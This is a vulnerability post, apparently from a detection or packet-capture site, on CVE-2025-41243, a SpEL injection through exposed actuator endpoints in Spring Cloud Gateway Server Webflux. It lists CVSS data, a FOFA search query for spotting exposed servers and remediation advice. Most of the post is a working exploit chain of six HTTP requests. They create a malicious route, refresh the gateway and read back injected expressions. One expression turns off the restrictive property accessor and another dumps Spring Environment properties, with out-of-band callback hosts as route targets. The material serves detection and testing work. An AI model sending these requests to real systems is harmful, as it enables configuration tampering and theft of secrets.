---
layout: post
cve_id: CVE-2025-41243
title: Spring Cloud Gateway Server Webflux - Broken Access Control
pcap: true
pcap_path: /pcaps/2025/CVE-2025-41243.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-41243.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Redmomn
severity: critical
impact: 'Attackers can modify Spring Environment properties, potentially leading to
  configuration tampering and further compromise.

  '
remediation: 'Secure actuator endpoints or disable gateway actuator exposure; update
  to latest Spring Cloud Gateway Server Webflux version.

  '
reference:
- https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/
- https://xz.aliyun.com/news/19006
- https://spring.io/security/cve-2025-41243
- https://nvd.nist.gov/vuln/detail/CVE-2025-41243
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10.0
  cve-id: CVE-2025-41243
  epss-score: 0.07004
  epss-percentile: 0.91187
  cwe-id: CWE-94
metadata:
  verified: true
  fofa-query: '((header="Server: Netty@SpringBoot" || (body="Whitelabel Error Page"
    && body="There was an unexpected error")) && body!="couchdb") || title="SpringBootAdmin-Server"
    || body="SpringBoot"'
tags:
- cve
- cve2025
- spring-boot
- injection
---

## üîç Vulnerability Description
Spring Cloud Gateway Server Webflux contains a vulnerability caused by unsecured and exposed actuator endpoints allowing modification of Spring Environment properties, letting attackers modify configuration, exploit requires unsecured actuator endpoints exposure.


## üåê HTTP Request
```nohighlight
POST /actuator/gateway/routes/KXWoYztt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 338
Content-Type: application/json
Accept-Encoding: gzip
{
"id": "KXWoYztt",
"filters": [
{
"name": "AddResponseHeader",
"args": {
"value": "#{ @systemProperties['spring. cloud.gateway.restrictive-property-accessor.enabled'] = false}",
"name": "cmd"
}
}
],
"uri": "http://d5jiq5ple0o4g71i50d0edf8aozt98pkp.oast.site",
"order": 0
}
```

```nohighlight
POST /actuator/gateway/refresh HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.14
Connection: close
Content-Length: 0
Accept-Encoding: gzip
```

```nohighlight
GET /actuator/gateway/routes/KXWoYztt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /actuator/gateway/routes/KXWoYztt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.2 Safari/605.1.15
Connection: close
Content-Length: 387
Content-Type: application/json
Accept-Encoding: gzip
{
"id": "KXWoYztt",
"filters": [
{
"name": "AddResponseHeader",
"args": {
"value": "#{ @environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*' ][0].source.![{#this.getKey+'='+#this.getValue.toString}] }",
"name": "cmd"
}
}
],
"uri": "http://d5jiq5ple0o4g71i50d0t7azwij7z43qw.oast.site",
"order": 0
}
```

```nohighlight
POST /actuator/gateway/refresh HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
Content-Length: 0
Accept-Encoding: gzip
```

```nohighlight
GET /actuator/gateway/routes/KXWoYztt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

